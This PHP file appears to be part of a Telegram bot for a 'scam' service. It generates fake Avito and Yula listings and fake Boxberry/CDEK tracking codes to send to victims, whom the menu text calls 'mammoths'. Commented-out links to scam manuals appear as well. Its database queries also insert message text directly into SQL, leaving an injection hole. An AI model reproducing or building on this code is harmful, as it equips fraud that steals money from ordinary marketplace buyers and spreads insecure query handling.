<?php

	if(preg_match('/\/start/i', $message['text']) == TRUE OR $message['text'] == '⬅️ Назад' OR preg_match('/^\/info$/i', $message['text']) == TRUE) {
		mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
		mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `worker` = '$message[from]' AND `status` = '0'");
		$keyboard = json_encode(Array('keyboard' => Array(Array('👤 Мой профиль', '🗂 Мои объявления'), Array('📦 Авито/Юла', '🚚 Boxberry/🚛 CDEK')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
		send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyProfile($message['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
	}
	
	if($message['text'] == '👤 Мой профиль') {
		send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyProfile($message['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyProfile($message['from'], 0, 1)));
	}
	
	if($message['text'] == '🗂 Мои объявления') {
		send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => getMyAdverts($message['from'], 0), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getMyAdverts($message['from'], 0, 1)));
	}
	
	
	if($message['text'] == '🦈') {
		send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => "🦈 Для @shark_avito", 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
	}
	
	if($message['text'] == '📦 Авито/Юла') {
		$text = "📦 <b>Авито/Юла</b>\n\n";
		$text .= "Мы немного изменили генерацию объявлений для Авито и Юлы, теперь она полностью никак не закрепляется за вашим настоящим объявлением на какой-либо из платформ\n\n";
		#$text .= "<a href=\"https://telegra.ph/Manual-po-skamu-na-avito-ot-WEBSCAM-01-07\">📦 Мануал по скаму на Авито</a>\n";
		
		$keyboard = json_encode(Array('keyboard' => Array(Array('📦 Авито', '🛍 Юла'), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
		
		send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
	}
	
	if($message['text'] == '📦 Авито' OR $message['text'] == '🛍 Юла') {
		$search = mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `worker` = '$message[from]' AND `status` = '0'");
		
		if(mysqli_num_rows($search) > 0) {
			$text = "👺 <b>У вас уже есть несозданное объявление</b>";
		} else {
			if($message['text'] == '📦 Авито') $type = '0';
			if($message['text'] == '🛍 Юла') $type = '1';
			
			mysqli_query($connection, "INSERT INTO `adverts` (`type`, `advert_id`, `worker`, `price`, `delivery`, `views`, `status`, `time`) VALUES ('$type', '".rand(10000000000, 99999999999)."', '$message[from]', '0', '0', '0', '0', '".time()."')");
		
			$text = "🎒 <b>Введите название вашего товара</b>";
			send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		}
	}
	
	if($message['text'] == '🚚 Boxberry/🚛 CDEK' OR $message['text'] == '🚛 Boxberry') {
		$text = "🚚 <b>Boxberry</b>/🚛 <b>CDEK</b>\n\n";
		$text .= "Теперь вы можете скамить не только на Авито и Юле, но и на любом другом российском ресурсе, где можно выставлять объявления (Форумы, барахолки, VK)\n\n";
		$text .= "Новый способ скама, с помощью которого вы можете сгенерировать трек-код на фейк сайте Boxberry/CDEK и отправить его своему мамонту\n\n";
		#$text .= "<a href=\"https://telegra.ph/Novaya-platforma-skama-Boxberry-01-07\">🆘 Мануал по скаму на Boxberry</a>";
		
		$keyboard = json_encode(Array('keyboard' => Array(Array('🔧 Сгенерировать трек-код'), Array('⬅️ Назад')), 'resize_keyboard' => TRUE, 'one_time_keyboard' => FALSE));
		
		send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => $keyboard));
	}
	
	if($message['text'] == '🔧 Сгенерировать трек-код') {
		$search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `worker` = '$message[from]' AND `status` = '0'");
		if(mysqli_num_rows($search) > 0) {
			$text = "👺 <b>У вас уже есть несозданный трек-код</b>";
		} else {
			mysqli_query($connection, "INSERT INTO `trackcodes` (`code`, `worker`, `status`, `time`) VALUES ('".rand(1000000, 99999999999)."', '$message[from]', '0', '".time()."')");
			$text = "🤓 <b>Введите ФИО отправителя товара</b>";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		}
	}

?>